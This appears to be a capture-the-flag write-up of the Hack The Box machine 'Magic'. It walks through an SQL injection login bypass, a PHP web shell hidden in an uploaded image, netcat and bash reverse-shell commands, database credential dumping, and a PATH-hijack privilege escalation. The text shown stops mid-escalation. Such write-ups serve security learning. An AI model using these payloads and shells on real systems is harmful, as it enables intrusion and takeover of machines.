---
title: "Magic"
date: 2024-07-24
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "magic", "htb writeup", "htb walkthrough", "hackthebox", "writeup"]
---

Magic presents a Linux web application vulnerable to both insecure file uploads and unsafe PHP function usage.
The initial foothold came from bypassing upload filters using crafted file extensions and manipulating MIME types.
Once a shell was established, local enumeration revealed a custom backup script running as root that unsafely parsed filenames.
Exploitation involved injecting commands through file names, leading to root shell.
Magic is a textbook case of chaining simple web bugs into full privilege escalation via local logic flaws.

OS: Linux

Difficulty: Medium

## Enumeration

### Nmap

```sh
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

### 80-HTTP

![screenshot](/assets/images/magic1.png)

> "PleaseÂ **[Login](http://10.10.10.185/login.php)**, to upload images."

#### login.php

![screenshot](/assets/images/magic2.png)

#### Fuzzing

```sh
ffuf -u http://{target IP} -H "Host: FUZZ.magic.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac

gobuster vhost -u http://{target IP} -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

## SQLi

`' or 1=1-- -` as the username 

![screenshot](/assets/images/magic3.png)

```sh
echo "GIF8<?php echo system($_GET["cmd"]);?>" > test.gif
```
![screenshot](/assets/images/magic4.png)

-> did not work 

## Foothold

### File Upload - Bypass filters

Download an actual image, and add `<?php echo system($_GET["cmd"]);?>` .

![screenshot](/assets/images/magic5.png)

![screenshot](/assets/images/magic7.png)

http://10.10.10.185/images/uploads/puppy.php.png?cmd=id

![screenshot](/assets/images/magic8.png)

Verified that the command injection worked.

```sh
# original payload
busybox nc 10.10.10.185 443 -e /bin/sh

# url encoded payload
busybox%20nc%2010.10.10.185%20443%20-e%20%2Fbin%2Fsh
```

Execute the command

![screenshot](/assets/images/magic10.png)

Getting a shell and upgrading it to interactive shell

![screenshot](/assets/images/magic11.png)

## Privilege Escalation

### Enumeration

`/var/www/Magic/db.php5` contains credentials.

![screenshot](/assets/images/magic12.png)

![screenshot](/assets/images/magic13.png)

![screenshot](/assets/images/magic14.png)

Dump the database using *mysqldump*

```sh
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
```

![screenshot](/assets/images/magic15.png)

Obtained another credential.

### Shell as theseus

`su` with the newly obtained credential.

![screenshot](/assets/images/magic17.png)

![screenshot](/assets/images/magic25.png)

```sh
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/5555 0>&1' > fdisk

chmod +x fdisk
theseus@ubuntu:/dev/shm$ export PATH="/dev/shm:$PATH"
theseus@ubuntu:/dev/shm$ echo $PATH    
```
![screenshot](/assets/images/magic26.png)
